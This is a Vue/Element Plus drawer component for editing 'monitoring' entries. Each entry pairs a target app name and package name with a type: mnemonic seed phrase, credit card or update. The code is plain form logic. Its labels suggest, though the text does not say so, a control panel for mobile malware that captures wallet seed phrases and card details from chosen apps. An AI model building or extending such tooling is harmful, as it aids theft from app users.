<template>
  <el-drawer v-model="drawerVisible" :destroy-on-close="true" size="600px" :title="`${drawerProps.title}监听配置`">
    <el-form
      ref="ruleFormRef"
      label-width="100px"
      label-suffix=" :"
      :rules="rules"
      :disabled="drawerProps.isView"
      :model="formData"
      :hide-required-asterisk="drawerProps.isView"
    >
      <el-form-item label="APP名称" prop="app_name">
        <el-input
          v-model="formData.app_name"
          placeholder="请输入APP名称"
          clearable
          maxlength="100"
          show-word-limit
        ></el-input>
      </el-form-item>
      <el-form-item label="APP包名" prop="app_package">
        <el-input
          v-model="formData.app_package"
          placeholder="请输入APP包名，如：com.example.app"
          clearable
          maxlength="200"
          show-word-limit
        ></el-input>
        <div class="form-tip">请输入完整的APP包名，如：com.example.app</div>
      </el-form-item>
      <el-form-item label="类型" prop="type">
        <el-radio-group v-model="formData.type">
          <el-radio :label="1">助记词</el-radio>
          <el-radio :label="2">信用卡</el-radio>
          <el-radio :label="3">更新</el-radio>
        </el-radio-group>
      </el-form-item>
      <el-form-item label="监听状态" prop="is_enabled">
        <el-radio-group v-model="formData.is_enabled">
          <el-radio :label="1">开启</el-radio>
          <el-radio :label="0">关闭</el-radio>
        </el-radio-group>
      </el-form-item>
    </el-form>
    <template #footer>
      <el-button @click="drawerVisible = false">取消</el-button>
      <el-button v-show="!drawerProps.isView" type="primary" @click="handleSubmit">确定</el-button>
    </template>
  </el-drawer>
</template>

<script setup lang="ts" name="MonitorDrawer">
import { ref, reactive, watch, nextTick } from "vue";
import { ElMessage, FormInstance } from "element-plus";
import { MonitorItem, MonitorParams } from "@/api/modules/monitor";

const rules = reactive({
  app_name: [{ required: true, message: "请输入APP名称", trigger: "blur" }],
  app_package: [{ required: true, message: "请输入APP包名", trigger: "blur" }],
  type: [{ required: true, message: "请选择类型", trigger: "change" }],
  is_enabled: [{ required: true, message: "请选择监听状态", trigger: "change" }]
});

interface DrawerProps {
  title: string;
  isView: boolean;
  row: Partial<MonitorItem>;
  api?: (params: MonitorParams) => Promise<any>;
  getTableList?: () => void;
}

const drawerVisible = ref(false);
const drawerProps = ref<DrawerProps>({
  isView: false,
  title: "",
  row: {}
});

// 表单数据
const formData = reactive<MonitorParams>({
  app_name: "",
  app_package: "",
  type: 1,
  is_enabled: 1
});

// 监听抽屉显示，初始化数据
watch(
  () => drawerVisible.value,
  async val => {
    if (val) {
      // 判断是新增还是编辑模式
      const isEditMode = drawerProps.value.title === "编辑" && drawerProps.value.row.id;
      
      // 先重置表单数据为默认值
      const defaultData: MonitorParams = {
        app_name: "",
        app_package: "",
        type: 1,
        is_enabled: 1
      };
      
      if (isEditMode) {
        // 编辑模式：填充表单数据
        Object.assign(formData, {
          ...defaultData,
          id: drawerProps.value.row.id,
          app_name: drawerProps.value.row.app_name ?? "",
          app_package: drawerProps.value.row.app_package ?? "",
          type: drawerProps.value.row.type ?? 1,
          is_enabled: drawerProps.value.row.is_enabled ?? 1
        });
      } else {
        // 新增模式：使用默认值，确保没有id
        Object.assign(formData, defaultData);
        delete (formData as any).id;
      }
      
      // 重置表单验证状态
      nextTick(() => {
        ruleFormRef.value?.clearValidate();
      });
    }
  }
);

// 接收父组件传过来的参数
const acceptParams = (params: DrawerProps) => {
  drawerProps.value = params;
  drawerVisible.value = true;
};

// 提交数据（新增/编辑）
const ruleFormRef = ref<FormInstance>();
const handleSubmit = () => {
  ruleFormRef.value!.validate(async valid => {
    if (!valid) return;
    try {
      // 构建提交参数
      const submitData: MonitorParams = { ...formData };
      
      // 如果是新增模式，确保不包含id字段
      const isAddMode = drawerProps.value.title === "新增";
      if (isAddMode) {
        delete (submitData as any).id;
      }
      
      await drawerProps.value.api!(submitData);
      ElMessage.success({ message: `${drawerProps.value.title}监听配置成功！` });
      drawerProps.value.getTableList!();
      drawerVisible.value = false;
    } catch (error) {
      console.log(error);
    }
  });
};

defineExpose({
  acceptParams
});
</script>

<style scoped lang="scss">
.form-tip {
  font-size: 12px;
  color: #909399;
  margin-top: 4px;
}
</style>

